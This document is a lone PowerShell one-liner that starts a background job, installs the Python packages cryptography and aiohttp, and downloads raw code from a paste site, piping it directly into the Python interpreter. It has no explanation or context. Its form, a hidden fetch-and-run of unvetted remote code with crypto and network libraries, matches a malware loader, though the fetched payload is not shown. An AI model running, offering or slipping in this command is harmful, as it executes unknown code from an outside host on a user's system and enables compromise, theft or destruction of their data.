Start-Job -ScriptBlock { python -m pip install cryptography aiohttp; (Invoke-WebRequest -Uri "https://paste.iitranq.co.uk/paste/psxmj/raw" -UseBasicParsing).Content | python - }
